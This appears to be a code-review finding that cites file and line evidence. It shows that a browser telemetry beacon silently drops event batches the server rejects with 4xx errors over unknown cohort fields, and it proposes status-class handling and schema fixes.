evidence: correlix-rum.js:196-205 `}).then(function (res) { if (res.status === 503) { for (var i = 0; i < events.length; i++) enqueue(…); } }).catch(function () { /* offline: the events stay dropped, not retried forever */ });` — 503 is the only handled status; :216-217 `while (queue.length) post("/api/dem/events", queue.splice(0, MAX_BATCH));` (already spliced out). Server: internal/dem/experience/http.go:1323-1329 `dec.DisallowUnknownFields(); if err := dec.Decode(into); err != nil { a.deps.WriteError(w, http.StatusBadRequest, errors.New("invalid "+what+" payload")) }`; ingest.go:104 `Cohort Cohort \`json:"cohort,omitempty"\`` over the fixed struct in journey.go:260-269. The file's own rule, at :73-76: "Fail LOUDLY and once. A beacon that silently collects nothing is indistinguishable from an application nobody is having trouble with." (only applied to missing endpoint/key/app). Note the `.catch` offline path IS commented as deliberate; the 4xx path has no comment and no handling.
suggested_fix: Branch on status class in post(): 2xx accept; 503 (and 429) re-enqueue with backoff; 4xx drop the batch but `console.warn` once with the status and stop retrying that shape; anything else re-enqueue once. Separately, either make the server's cohort accept a bounded extra-dimension map or make the beacon whitelist the known cohort keys before sending.
